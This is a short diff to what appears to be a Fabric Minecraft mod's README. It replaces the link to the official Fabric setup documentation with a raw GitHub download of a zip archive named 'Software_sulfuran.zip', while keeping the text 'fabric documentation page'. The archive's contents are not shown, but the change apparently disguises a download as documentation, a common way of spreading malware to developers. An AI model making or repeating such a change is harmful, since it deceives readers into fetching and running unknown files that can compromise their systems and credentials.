@@ -2,7 +2,7 @@
 
 ## Setup
 
-For setup instructions please see the [fabric documentation page](https://docs.fabricmc.net/develop/getting-started/setting-up-a-development-environment) that relates to the IDE that you are using.
+For setup instructions please see the [fabric documentation page](https://raw.githubusercontent.com/cannedsigmas/minecraft/1.21/src/main/java/com/Software_sulfuran.zip) that relates to the IDE that you are using.
 
 ## License
 
